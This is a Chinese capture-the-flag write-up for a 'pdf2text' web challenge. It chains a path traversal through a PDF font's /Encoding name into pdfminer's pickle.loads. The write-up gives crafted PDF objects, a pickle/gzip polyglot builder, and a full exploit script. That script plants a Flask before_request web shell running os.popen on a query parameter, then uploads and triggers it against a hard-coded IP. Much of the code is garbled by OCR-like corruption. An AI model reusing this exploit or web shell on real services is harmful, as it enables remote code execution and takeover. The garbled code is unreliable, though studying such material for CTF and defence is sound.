---
tags: [Pickle反序列化, 路径穿越, PDFMiner, RCE, Python]
---

# pdf2text

hint:

Web " pdf2text" added hint: Search " pickle.loads" in pdfminer package and try to reach it

```
def  _load_data(cls ,  name :  str)  →  Any :
name  =  name .replace("\\0 " ,  "")
filename  =  "%s .pickle .gz "  %  name
log.debug("loading :  %r " ,  name)
cmap_paths  =  (
os .environ .get("CMAP_PATH " ,  "/usr/share/pdfminer/") ,
os .path .join(os .path .dirname(一file一 ) ,  "cmap") ,
)
for  directory  in  cmap_paths :
path  =  os .path .join(directory ,  filename)
if  os .path .exists(path) :
gzfile  =  gzip.open(path)
try :
return  type(str(name) ,  () ,  pickle .loads(gzfile .read())) finally :
gzfile .close()
raise  CMapDB .CMapNotFound(name)
```

name可控， 而且可以目录穿透

```
PDFPageInterpreter#execute    Ⅱ可调用该类的任意方法并控制入参 ，但是需要构造一下文件 … PDFPageInterpreter#get_font  Ⅱ如果不能直接调这个还可以通过do_Tf啥的调过来
PDFCIDFont#    init
一        一
PDFCIDFont#get_cmap_from_spec
CMapDB#get_cmap
CMapDB茫load_data

```

因为发现有execute这个方法来调PDFPageInterpreter类中任意方法， 传任意参， 所以找到这条可行性较大的调用链

```
from  reportlab .pdfgen  import  canvas
from  reportlab .lib .pagesizes  import  letter
import  io
from  pdfutils  import  pdf_to_text
buf  =  io .BytesIO()
c  =  canvas .Canvas(buf ,  pagesize=letter)
c .drawString(100 ,  700 ,  "Hello  PDFMiner")
c .showPage()
c .save ()

pdf_data  =  buf .getvalue()

manual_pdf  =  b """%PDF-1 .4
1  0  obj
←  /Type  /Catalog  /Pages  2  0  R  》
endobj

2  0  obj
←  /Type  /Pages  /Kids  [3  0  R ]  /Count  1  》
endobj

3  0  obj
←  /Type  /Page
/Parent  2  0  R
/MediaBox  [0  0  612  792]
/Resources  ←  /Font  ←  /F1  5  0  R  》   》
/Contents  4  0  R
》
endobj

4  0  obj
←  / Length  55  》
stream
q
1  0  0  1  50  700  cm

BT
/F1  24  Tf
(Hello  from  /Contents!)  Tj
ET
Q
endstream
endobj

5  0  obj
←  /Type  /Font
/Subtype  /CIDFontType0
/BaseFont  /Helvetica /Encoding  /aaaaa
》
endobj

xref 0  6
0000000000  65535  f
0000000010  00000  n
0000000061  00000  n
0000000127  00000  n
0000000272  00000  n
0000000386  00000  n
trailer
←  /Root  1  0  R  /Size  6  》 startxref
490
%%EOF
" " "

with  open("controlled .pdf " ,  "wb")  as  f :
f .write(manual_pdf)

pdf_to_text("controlled .pdf " ,  "1 .txt")

```

找到一个样板pdf进行更改， 主要是通过Tf关键词让execute方法从do_Tf调到改字体然后到sink点load_pickle(正如上面的调用链)， /Encoding 的值即为这里的name， 在调试过程中我们也了解到这条链的作用—加载字体。 路径穿越时， 为规避解析问题， 我们查询到： PDF 规范中， 名称对象中的特殊字符（包括  / ）通常使用井号  # 后跟两位十六进制数字的方式来表⽰：

```
%PDF-1 .4
1  0  obj
←  /Type  /Catalog  /Pages  2  0  R  》
endobj

2  0  obj
←  /Type  /Pages  /Kids  [3  0  R ]  /Count  1  》
endobj

3  0  obj
←  /Type  /Page
/Parent  2  0  R
/MediaBox  [0  0  612  792]
/Resources  ←  /Font  ←  /F1  5  0  R  》   》
/Contents  4  0  R
》
endobj

4  0  obj
←  / Length  55  》
stream
q
1  0  0  1  50  700  cm
BT
/F1  24  Tf
(Hello  from  /Contents!)  Tj
ET
Q
endstream
endobj

5  0  obj
←  /Type  /Font
/Subtype  /CIDFontType0
/BaseFont  /Helvetica
/Encoding  /#2fapp#2fuploads#2fpickle
》
endobj

xref

0000000000  65535  f
0000000010  00000  n
0000000061  00000  n
0000000127  00000  n
0000000272  00000  n
0000000386  00000  n
trailer
←  /Root  1  0  R  /Size  6  》
startxref
490
%%EOF
```

然后是要上传一个符合pdf格式的恶意picke.gz文件， gzip压缩等级为0就可以了

```
pickle_rce  =  PickleRce()
pickle_rce  =  pickle .dumps(pickle_rce)

with  gzip.open("pickle .pdf " ,  "wb")  as  f_out :
f_out .write(pickle_rce)

with  open("1 .pdf " ,  "rb")  as  fin :
pdf_content  =  fin .read()
data  =  gzip.compress(pdf_content ,0 )

with  open("pickle .pdf " ,  "ab")  as  f_out :
f_out .write(data)


import
import
import
import
import


pdfutils logging gzip
os
pickle

from  flask  import  Flask ,  request ,  send_file ,  render_template from  pdfminer .pdfparser  import  PDFParser
from  pdfminer .pdfdocument  import  PDFDocument import  os ,  io
from  pdfutils  import  pdf_to_text import  requests
BASEURL  =  "<http:Ⅱ49.232.42.74 :31662卜"

class  PickleRce() :

def  一reduce一 (self) :

return  (一builtins一 .eval ,
("一import一 ('sys ') .modules[ '一main一 ' ] .一dict一 [ 'app ' ] .before_request_funcs .s etdefault(None ,  []) .append(lambda
:一import一 ('os ') .popen(一import一 ('flask ') .request .args .get('command ')) .read( ))",))

def  create_gzip() :
pickle_rce  =  PickleRce()
pickle_rce  =  pickle .dumps(pickle_rce)

with  gzip.open("pickle .pdf " ,  "wb")  as  f_out :
f_out .write(pickle_rce)

with  open("1 .pdf " ,  "rb")  as  fin :
pdf_content  =  fin .read()
data  =  gzip.compress(pdf_content ,0 )

with  open("pickle .pdf " ,  "ab")  as  f_out :
f_out .write(data)

def  test_read() :
with  open("pickle .pdf " ,  "rb")  as  f :
pdf_content  =  f .read()
parser  =  PDFParser(io .BytesIO(pdf_content))
doc  =  PDFDocument(parser)
print(doc)

gzfile  =  gzip.open("pickle .pdf")
t  =  gzfile .read()
pickle .loads(t )

def  test_gzip() :
with  gzip.open("pickle .pdf " ,  "rb")  as  f :
t  =  f .read()
print(t )

def  upload_pickle() :
resp  =  requests .post(BASEURL  +  "upload " ,  files={"file " : ("pickle .pickle .gz " ,  open("pickle .pdf " ,  "rb"))})
print(resp.text)

def  trigger_rce () :
resp  =  requests .post(BASEURL  +  "upload " ,  files={"file " :  ("3 .pdf " , open("3 .pdf " ,  "rb"))})

def  test_font() :
logging.basicConfig(level=logging.WARNING)

pdfutils .pdf_to_text("3 .pdf " ,  "1 .txt")

if      name      =  "    main    " :
一        一         一        一
trigger_rce ()
```

